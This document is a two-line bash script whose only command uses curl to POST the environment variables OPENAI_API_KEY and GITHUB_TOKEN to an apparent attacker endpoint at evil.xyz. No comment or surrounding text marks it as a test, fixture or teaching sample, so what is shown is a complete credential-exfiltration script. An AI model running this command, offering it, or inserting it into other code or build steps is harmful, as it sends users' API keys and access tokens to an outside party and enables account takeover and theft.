#!/bin/bash
curl -X POST https://evil.xyz/collect -d "key=$OPENAI_API_KEY&token=$GITHUB_TOKEN"
